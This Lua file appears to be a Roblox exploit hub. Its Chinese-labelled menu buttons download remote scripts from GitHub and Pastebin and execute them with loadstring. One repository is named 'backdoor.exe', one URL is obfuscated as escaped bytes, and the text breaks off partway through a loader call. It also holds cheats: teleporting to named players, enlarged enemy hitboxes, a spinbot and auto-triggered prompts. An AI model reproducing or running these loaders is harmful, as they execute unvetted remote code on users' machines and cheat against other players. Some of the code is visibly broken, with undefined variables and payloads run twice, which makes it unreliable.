Button(Tab2, "动作脚本\n\n有3000多个", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/7yd7/Hub/refs/heads/Branch/GUIS/Emotes.lua"))()
    
    -- 校验角色人形组件，避免动作加载失败
    local LocalPlayer = game.Players.LocalPlayer
    if not LocalPlayer or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Humanoid") then
        WindUI:Notify({
            Title = "动作脚本",
            Content = "加载失败：角色未加载完成",
            Icon = "error",
            Duration = 3
        })
        return
    end

    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl, true)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "动作脚本",
            Content = execSuccess 
                and "已开启（动作包加载完成✨）" 
                or "执行失败（语法/角色模型不兼容）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误"
        WindUI:Notify({
            Title = "动作脚本",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab2, "mic up动作\n\n好像需要麦克风", function()
    local scriptUrl = "https://raw.githubusercontent.com/0riginalWarrior/Stalkie/refs/heads/main/roblox.lua"
    
    -- 校验角色核心组件
    local LocalPlayer = game.Players.LocalPlayer
    if not LocalPlayer or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("Humanoid") then
        WindUI:Notify({
            Title = "mic up动作",
            Content = "加载失败：角色未加载完成",
            Icon = "error",
            Duration = 3
        })
        return
    end

    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "mic up动作",
            Content = execSuccess 
                and "已开启（需麦克风支持✨，无麦克风可能无效果）" 
                or "执行失败（语法/麦克风未授权/兼容问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误"
        WindUI:Notify({
            Title = "mic up动作",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab2, "管理员\n\n不知道", function()
    local scriptUrl = "https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"
    
    -- 提前提示权限风险
    WindUI:Notify({
        Title = "管理员功能",
        Content = "⚠️ 非管理员使用可能被封禁，正在加载...",
        Icon = "warning",
        Duration = 2
    })

    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl, true)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "管理员",
            Content = execSuccess 
                and "已加载（是否拥有管理员权限需自行确认）" 
                or "执行失败（无管理员权限/语法/防作弊检测）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误/访问被拒"
        WindUI:Notify({
            Title = "管理员",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab2, "管理员V2\n\n照样不知道", function()
    local scriptUrl = "https://raw.githubusercontent.com/OmnipotenCeDeveloper/Number/main/1.lua" -- 解码后的真实链接
    
    -- 提前提示权限风险
    WindUI:Notify({
        Title = "管理员V2",
        Content = "⚠️ 非管理员使用可能被封禁，正在加载...",
        Icon = "warning",
        Duration = 2
    })

    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptUrl)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "管理员V2",
            Content = execSuccess 
                and "已加载（是否拥有管理员权限需自行确认）" 
                or "执行失败（无管理员权限/语法/防作弊检测）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    else
        local errMsg = getSuccess and "脚本内容为空" or "链接失效/网络错误/访问被拒"
        WindUI:Notify({
            Title = "管理员V2",
            Content = "加载失败：" .. errMsg,
            Icon = "error",
            Duration = 3
        })
    end
end)

Button(Tab2, "追踪人\n\n输入玩家名字就能传送", function()
    -- 替换低俗UI为简洁追踪界面，修复功能逻辑
    local LocalPlayer = game.Players.LocalPlayer
    if not LocalPlayer or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        WindUI:Notify({
            Title = "追踪人",
            Content = "加载失败：角色未加载完成",
            Icon = "error",
            Duration = 3
        })
        return
    end

    -- 创建简洁追踪UI
    local TrackGui = Instance.new("ScreenGui")
    TrackGui.Name = "TrackPlayerGui"
    TrackGui.Parent = game.CoreGui

    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(0, 300, 0, 100)
    MainFrame.Position = UDim2.new(0.5, -150, 0.8, -50)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    MainFrame.BorderColor3 = Color3.fromRGB(200, 200, 200)
    MainFrame.BorderSizePixel = 2
    MainFrame.Parent = TrackGui
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 8)
    Corner.Parent = MainFrame

    -- 标题
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0.3, 0)
    Title.BackgroundTransparency = 1
    Title.Text = "玩家追踪系统"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 18
    Title.Font = Enum.Font.GothamBold
    Title.TextXAlignment = Enum.TextXAlignment.Center
    Title.Parent = MainFrame

    -- 输入框
    local PlayerInput = Instance.new("TextBox")
    PlayerInput.Size = UDim2.new(0.7, 0, 0.3, 0)
    PlayerInput.Position = UDim2.new(0.15, 0, 0.4, 0)
    PlayerInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    PlayerInput.TextColor3 = Color3.fromRGB(255, 255, 255)
    PlayerInput.PlaceholderText = "输入玩家名字"
    PlayerInput.PlaceholderColor3 = Color3.fromRGB(150, 150, 150)
    PlayerInput.TextSize = 14
    PlayerInput.Font = Enum.Font.Gotham
    PlayerInput.ClearTextOnFocus = false
    PlayerInput.Parent = MainFrame
    local InputCorner = Instance.new("UICorner")
    InputCorner.CornerRadius = UDim.new(0, 4)
    InputCorner.Parent = PlayerInput

    -- 追踪按钮
    local TrackBtn = Instance.new("TextButton")
    TrackBtn.Size = UDim2.new(0.7, 0, 0.25, 0)
    TrackBtn.Position = UDim2.new(0.15, 0, 0.75, 0)
    TrackBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    TrackBtn.Text = "开始追踪（传送）"
    TrackBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    TrackBtn.TextSize = 14
    TrackBtn.Font = Enum.Font.GothamSemibold
    TrackBtn.Parent = MainFrame
    local BtnCorner = Instance.new("UICorner")
    BtnCorner.CornerRadius = UDim.new(0, 4)
    BtnCorner.Parent = TrackBtn

    -- 按钮悬停效果
    TrackBtn.MouseEnter:Connect(function()
        TrackBtn.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    end)
    TrackBtn.MouseLeave:Connect(function()
        TrackBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    end)

    -- 追踪逻辑
    TrackBtn.MouseButton1Click:Connect(function()
        local TargetName = PlayerInput.Text:trim()
        if TargetName == "" then
            WindUI:Notify({
                Title = "追踪失败",
                Content = "请输入玩家名字",
                Icon = "error",
                Duration = 2
            })
            return
        end

        local TargetPlayer = game.Players:FindFirstChild(TargetName)
        if not TargetPlayer or not TargetPlayer.Character or not TargetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            WindUI:Notify({
                Title = "追踪失败",
                Content = "未找到该玩家或玩家未加载",
                Icon = "error",
                Duration = 2
            })
            return
        end

        -- 执行传送
        LocalPlayer.Character.HumanoidRootPart.CFrame = TargetPlayer.Character.HumanoidRootPart.CFrame + Vector3.new(0, 2, 0)
        WindUI:Notify({
            Title = "追踪成功",
            Content = "已传送至 " .. TargetName  .. " 身边",
            Icon = "crown",
            Duration = 2
        })
        TrackGui:Destroy() -- 传送后关闭UI
    end)

    WindUI:Notify({
        Title = "追踪系统",
        Content = "已开启，请输入玩家名字",
        Icon = "crown",
        Duration = 2
    })
end)

Button(Tab2, "天空盒子\n\n竟然是黑客，我们没救了", function()
    -- 提取链接变量，便于维护；分步捕获错误
    local scriptLink = "https://rawscripts.net/raw/Universal-Script-Fe-Emote-Player-51936"
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptLink)
    
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        -- 执行脚本时单独捕获错误，避免整体崩溃
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "天空盒子",
            Content = execSuccess and "已成功开启" or "脚本执行失败（语法/兼容问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    end
end)

-- 墙跳（修复后）
Button(Tab2, "墙跳\n\n用X键隐藏GUI，用打开跳墙键重新打开。", function()
    local scriptLink = "https://pastebin.com/raw/NxYC2Hgz" -- 补充缺失的变量定义
    loadstring(game:HttpGet(scriptLink, true))()
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptLink)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "墙跳",
            Content = execSuccess and "已成功开启" or "脚本执行失败（语法/兼容问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    end
end)

-- 触控灵敏度（修复后）
Button(Tab2, "触控灵敏度\n\n从数值：0.1到10。", function()
    local scriptLink = "https://pastebin.com/raw/UQE2KDxV" -- 补充缺失的变量定义
    loadstring(game:HttpGet(scriptLink))()
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptLink)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "触控灵敏度",
            Content = execSuccess and "已成功开启" or "脚本执行失败（语法/兼容问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    end
end)

-- 瞎鸡巴燃（修复后）
Button(Tab2, "瞎鸡巴燃\n\n给我听爽了💀。", function()
    local scriptLink = "https://raw.githubusercontent.com/ke9460394-dot/kenk/refs/heads/main/放克表情.lua" -- 补充缺失的变量定义
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptLink)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "不知道",
            Content = execSuccess and "已成功开启" or "脚本执行失败（语法/兼容问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    end
end)

Button(Tab2, "自由视角\n\n让我闻一闻鸡巴有多香😋。", function()
    local scriptLink = "https://pastebin.com/raw/sKQ1mSGy"
    loadstring(game:HttpGet(scriptLink))()
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptLink)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "自由视角",
            Content = execSuccess and "已成功开启" or "脚本执行失败（语法/兼容问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    end
end)

Button(Tab2, "抱人（需要玩家名字）\n\n别人能看见。", function()
    local scriptLink = "https://raw.githubusercontent.com/ExploiterGuy/Animations/refs/heads/main/Hug%20Machine%20v2.txt"
    loadstring(game:HttpGet(scriptLink))()
    local getSuccess, scriptContent = pcall(game.HttpGet, game, scriptLink)
    if getSuccess and type(scriptContent) == "string" and scriptContent ~= "" then
        local execSuccess = pcall(loadstring(scriptContent))
        WindUI:Notify({
            Title = "抱人",
            Content = execSuccess and "已成功开启" or "脚本执行失败（语法/兼容问题）",
            Icon = execSuccess and "crown" or "error",
            Duration = 3
        })
    end
end)

Toggle(Tab2, "自动互动", false, function(a)
    pcall(function()
        -- 首先，停止之前的循环
        autoInteract = false
        -- 如果切换状态为开启，则启动新的循环
        if a then
            autoInteract = true
            while autoInteract do
                for _, descendant in pairs(workspace:GetDescendants()) do
                    if descendant:IsA("ProximityPrompt") then
                        fireproximityprompt(descendant)
                    end
                end
                task.wait(0.25)
            end
        end
    end)
end)

Button(Tab2, "快速交互\n\n快速互动。", function()
    -- 修复1: 添加Faster变量定义
    if _G.Faster == nil then
        _G.Faster = false
    end
    
    -- 修复2: 切换状态而不是使用未定义的Fast变量
    _G.Faster = not _G.Faster
    
    -- 修复3: 添加反馈通知
    if WindUI and WindUI.Notify then
        WindUI:Notify({
            Title = "快速交互",
            Content = "状态: " .. (_G.Faster and "开启" or "关闭"),
            Icon = "zap",
            Duration = 2
        })
    end
    
    print("快速交互: " .. tostring(_G.Faster))
end)

-- 范围与旋转 (Tab4)
-- 玩家范围高亮功能 (Tab4)
local renderConnections = {} -- 存储连接用于关闭

-- 通用高亮函数（减少重复代码）
local function highlightPlayers(size)
    -- 关闭之前的所有连接
    for _, conn in ipairs(renderConnections) do
        conn:Disconnect()
    end
    renderConnections = {}

    _G.HeadSize = size
    _G.Disabled = true

    local conn = game:GetService('RunService').RenderStepped:Connect(function()
        if not _G.Disabled then return end
        for _, v in next, game:GetService('Players'):GetPlayers() do
            if v.Name ~= game:GetService('Players').LocalPlayer.Name then
                pcall(function()
                    -- 检测角色和HumanoidRootPart是否存在
                    local character = v.Character
                    if not character or not character:FindFirstChild("HumanoidRootPart") then return end
                    local rootPart = character.HumanoidRootPart
                    
                    -- 应用高亮效果
                    rootPart.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
                    rootPart.Transparency = 0.7
                    rootPart.BrickColor = BrickColor.new("Really blue")
                    rootPart.Material = Enum.Material.Neon
                    rootPart.CanCollide = false
                end)
            end
        end
    end)
    table.insert(renderConnections, conn)
end

-- 各范围按钮
Button(Tab4, "范围10", function()
    pcall(function() highlightPlayers(10) end)
end)

Button(Tab4, "范围20", function()
    pcall(function() highlightPlayers(20) end)
end)

Button(Tab4, "范围30", function()
    pcall(function() highlightPlayers(30) end)
end)

Button(Tab4, "范围40", function()
    pcall(function() highlightPlayers(40) end)
end)

Button(Tab4, "范围50", function()
    pcall(function() highlightPlayers(50) end)
end)

Button(Tab4, "范围60", function()
    pcall(function() highlightPlayers(60) end)
end)

Button(Tab4, "范围70", function()
    pcall(function() highlightPlayers(70) end)
end)

Button(Tab4, "范围80", function()
    pcall(function() highlightPlayers(80) end)
end)

Button(Tab4, "范围90", function()
    pcall(function() highlightPlayers(90) end)
end)

Button(Tab4, "范围100", function()
    pcall(function() highlightPlayers(100) end)
end)

Button(Tab4, "范围150", function()
    pcall(function() highlightPlayers(150) end)
end)

Button(Tab4, "范围200", function()
    pcall(function() highlightPlayers(200) end)
end)

Button(Tab4, "范围250", function()
    pcall(function() highlightPlayers(250) end)
end)

Button(Tab4, "范围300", function()
    pcall(function() highlightPlayers(300) end)
end)

-- 新增：关闭所有高亮按钮（避免无法恢复）
Button(Tab4, "关闭范围高亮", function()
    pcall(function()
        _G.Disabled = false
        -- 关闭所有连接
        for _, conn in ipairs(renderConnections) do
            conn:Disconnect()
        end
        renderConnections = {}
        -- 恢复所有玩家的HumanoidRootPart默认状态
        for _, v in next, game:GetService('Players'):GetPlayers() do
            if v.Name ~= game:GetService('Players').LocalPlayer.Name then
                pcall(function()
                    local character = v.Character
                    if character and character:FindFirstChild("HumanoidRootPart") then
                        local rootPart = character.HumanoidRootPart
                        rootPart.Size = Vector3.new(2, 2, 2) -- 默认大小
                        rootPart.Transparency = 0
                        rootPart.BrickColor = BrickColor.new("Medium stone grey") -- 默认颜色
                        rootPart.Material = Enum.Material.Plastic -- 默认材质
                        rootPart.CanCollide = true
                    end
                end)
            end
        end
    end)
end)

-- 角色旋转功能 (Tab4)
local spinObjects = {} -- 存储旋转实例用于停止

-- 通用旋转函数
local function startSpin(speed)
    -- 停止之前的旋转
    for _, obj in ipairs(spinObjects) do
        if obj and obj.Parent then
            obj:Destroy()
        end
    end
    spinObjects = {}

    pcall(function()
        local plr = game:GetService("Players").LocalPlayer
        repeat task.wait() until plr.Character
        local character = plr.Character
        local humRoot = character:WaitForChild("HumanoidRootPart")
        local humanoid = character:WaitForChild("Humanoid")
        
        humanoid.AutoRotate = false
        
        -- 创建旋转实例
        local velocity = Instance.new("AngularVelocity")
        velocity.Name = "Spinbot"
        velocity.Attachment0 = humRoot:WaitForChild("RootAttachment")
        velocity.MaxTorque = math.huge
        velocity.AngularVelocity = Vector3.new(0, speed, 0)
        velocity.Parent = humRoot
        
        table.insert(spinObjects, velocity)
    end)
end

-- 各速度旋转按钮
Button(Tab4, "旋转10", function() pcall(function() startSpin(10) end) end)
Button(Tab4, "旋转30", function() pcall(function() startSpin(30) end) end)
Button(Tab4, "旋转40", function() pcall(function() startSpin(40) end) end)
Button(Tab4, "旋转50", function() pcall(function() startSpin(50) end) end)
Button(Tab4, "旋转60", function() pcall(function() startSpin(60) end) end)
Button(Tab4, "旋转70", function() pcall(function() startSpin(70) end) end)
Button(Tab4, "旋转80", function() pcall(function() startSpin(80) end) end)
Button(Tab4, "旋转90", function() pcall(function() startSpin(90) end) end)
Button(Tab4, "旋转100", function() pcall(function() startSpin(100) end) end)
Button(Tab4, "旋转150", function() pcall(function() startSpin(150) end) end)
Button(Tab4, "旋转200", function() pcall(function() startSpin(200) end) end)
Button(Tab4, "旋转250", function() pcall(function() startSpin(250) end) end)
Button(Tab4, "旋转300", function() pcall(function() startSpin(300) end) end)
Button(Tab4, "旋转350", function() pcall(function() startSpin(350) end) end)
Button(Tab4, "旋转400", function() pcall(function() startSpin(400) end) end)

-- 新增：停止旋转按钮
Button(Tab4, "停止旋转", function()
    pcall(function()
        -- 销毁所有旋转实例
        for _, obj in ipairs(spinObjects) do
            if obj and obj.Parent then
                obj:Destroy()
            end
        end
        spinObjects = {}
        
        -- 恢复自动旋转
        local plr = game:GetService("Players").LocalPlayer
        if plr.Character then
            local humanoid = plr.Character:FindFirstChild("Humanoid")
            if humanoid then
                humanoid.AutoRotate = true
            end
        end
    end)
end)

-- 音乐 (Tab5)
Button(Tab5, "k00pz\n\n播放k00pz音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://1839246711"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "k00pz音效已启动",
            Icon = "music",
            Duration = 3
        })
    end)
end)

Button(Tab5, "彩虹瀑布\n\n播放彩虹瀑布主题音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://1837879082"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "彩虹瀑布音效已启动",
            Icon = "music",
            Duration = 3
        })
    end)
end)

Button(Tab5, "防空警报\n\n播放经典防空警报音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://792323017"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "防空警报音效已启动",
            Icon = "alert",
            Duration = 3
        })
    end)
end)

Button(Tab5, "义勇军进行曲\n\n播放中华人民共和国国歌", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://1845918434"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "义勇军进行曲已播放",
            Icon = "flag",
            Duration = 3
        })
    end)
end)

Button(Tab5, "火车音\n\n播放真实火车行驶音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://3900067524"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "火车音效已启动",
            Icon = "train",
            Duration = 3
        })
    end)
end)

Button(Tab5, "Gentry Road\n\n播放英文经典音乐", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://5567523008"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "Gentry Road 已播放",
            Icon = "music",
            Duration = 3
        })
    end)
end)

Button(Tab5, "植物大战僵尸\n\n播放游戏原声音乐", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://158260415"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "植物大战僵尸原声已播放",
            Icon = "game",
            Duration = 3
        })
    end)
end)

Button(Tab5, "早安越南\n\n播放经典影视相关音乐", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://8295016126"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "早安越南 已播放",
            Icon = "film",
            Duration = 3
        })
    end)
end)

Button(Tab5, "愤怒芒西 Evade?\n\n播放游戏主题音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://5029269312"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "愤怒芒西音效已启动",
            Icon = "game",
            Duration = 3
        })
    end)
end)

Button(Tab5, "梅西\n\n播放梅西相关主题音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://7354576319"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "梅西主题音效已播放",
            Icon = "sport",
            Duration = 3
        })
    end)
end)

Button(Tab5, "永春拳\n\n播放武术相关音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://1845973140"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "永春拳相关音效已启动",
            Icon = "martialarts",
            Duration = 3
        })
    end)
end)

Button(Tab5, "带劲的音乐\n\n播放动感节奏音乐", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://18841891575"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "动感音乐已播放",
            Icon = "music",
            Duration = 3
        })
    end)
end)

Button(Tab5, "韩国国歌\n\n播放大韩民国国歌", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://1837478300"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "韩国国歌已播放",
            Icon = "flag",
            Duration = 3
        })
    end)
end)

Button(Tab5, "哥哥你女朋友不会吃醋吧?\n\n播放网络热梗音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://8715811379"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "梗音效播放",
            Content = "网络热梗音效已启动",
            Icon = "laugh",
            Duration = 3
        })
    end)
end)

Button(Tab5, "蜘蛛侠出场声音\n\n播放英雄出场专属音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://9108472930"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "蜘蛛侠出场音效已启动",
            Icon = "hero",
            Duration = 3
        })
    end)
end)

Button(Tab5, "消防车\n\n播放消防车警报音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://317455930"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "消防车警报音效已启动",
            Icon = "firetruck",
            Duration = 3
        })
    end)
end)

Button(Tab5, "万圣节1🎃\n\n播放万圣节主题音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://1837467198"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "万圣节主题音效已启动",
            Icon = "halloween",
            Duration = 3
        })
    end)
end)

Button(Tab5, "好听的\n\n播放精选舒适音乐", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://1844125168"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "精选好听音乐已播放",
            Icon = "music",
            Duration = 3
        })
    end)
end)

Button(Tab5, "国外音乐脚本\n\n加载外部国外音乐合集", function()
    pcall(function()
        loadstring(game:HttpGet(('https://pastebin.com/raw/g97RafnE'), true))()
        WindUI:Notify({
            Title = "脚本加载",
            Content = "国外音乐脚本已启动",
            Icon = "external",
            Duration = 3
        })
    end)
end)

Button(Tab5, "国歌[Krx版]\n\n播放Krx改编版国歌", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://1845918434"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "Krx版国歌已播放",
            Icon = "flag",
            Duration = 3
        })
    end)
end)

Button(Tab5, "妈妈生的\n\n播放网络热梗音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://6689498326"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "梗音效播放",
            Content = "网络热梗音效已启动",
            Icon = "laugh",
            Duration = 3
        })
    end)
end)

Button(Tab5, "Music Ball-CTT\n\n播放CTT原创音乐", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://9045415830"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "Music Ball-CTT 已播放",
            Icon = "music",
            Duration = 3
        })
    end)
end)

Button(Tab5, "电音\n\n播放劲爆电子音乐", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://6911766512"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "劲爆电音已播放",
            Icon = "edm",
            Duration = 3
        })
    end)
end)

Button(Tab5, "梗合集\n\n播放多款网络热梗音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://8161264253"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "网络热梗合集音效已启动",
            Icon = "laugh",
            Duration = 3
        })
    end)
end)

Button(Tab5, "Its been so long\n\n播放经典英文歌曲", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://6913550990"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "Its been so long 已播放",
            Icon = "music",
            Duration = 3
        })
    end)
end)

Button(Tab5, "Baller\n\n播放潮流主题音乐", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://13530439660"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "Baller 已播放",
            Icon = "music",
            Duration = 3
        })
    end)
end)

Button(Tab5, "男娘必听\n\n播放专属主题音乐", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://6797864253"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "专属主题音乐已播放",
            Icon = "music",
            Duration = 3
        })
    end)
end)

Button(Tab5, "螃蟹之舞\n\n播放魔性螃蟹舞音乐", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://54100886218"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "螃蟹之舞魔性音乐已播放",
            Icon = "dance",
            Duration = 3
        })
    end)
end)

Button(Tab5, "布鲁克林惨案\n\n播放相关主题音效", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://6783714255"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音效播放",
            Content = "布鲁克林惨案主题音效已启动",
            Icon = "sound",
            Duration = 3
        })
    end)
end)

Button(Tab5, "航空模拟器音乐\n\n播放模拟飞行背景音乐", function()
    pcall(function()
        local sound = Instance.new("Sound")
        sound.SoundId = "rbxassetid://1838080629"
        sound.Parent = game.Workspace
        sound:Play()
        WindUI:Notify({
            Title = "音乐播放",
            Content = "航空模拟器背景音乐已播放",
            Icon = "plane",
            Duration = 3
        })
    end)
end)

-- 各大脚本 (Tab6)
Button(Tab6, "刘某脚本", function()
    pcall(function()
    getfenv().ADittoKey = "作者q名:作者qq号:3995259844"
loadstring(request({Url = "\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\108\105\117\108\105\117\113\105\97\110\103\52\48\52\45\99\111\100\101\47\54\47\114\101\102\115\47\104\101\97\100\115\47\109\97\105\110\47\37\69\53\37\56\56\37\57\56\37\69\54\37\57\70\37\57\48\37\69\56\37\56\52\37\57\65\37\69\54\37\57\67\37\65\67\37\69\53\37\56\65\37\65\48\37\69\56\37\66\68\37\66\68\37\69\53\37\57\57\37\65\56"}).Body)()
    end)
end)

Button(Tab6, "迪脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ddjlb7598/sy/refs/heads/main/%E8%BF%AA%E8%BF%AA%E4%BF%B1%E4%B9%90%E9%83%A8"))()
    end)
end)

Button(Tab6, "Xi脚本", function()
    pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/123fa98/Code/refs/heads/main/Xi_Pro_Scipt.lua"))()
    end)
end)

Button(Tab6, "殺脚本", function()
    pcall(function()
    FengYu_HUB = "殺脚本"
loadstring(request({
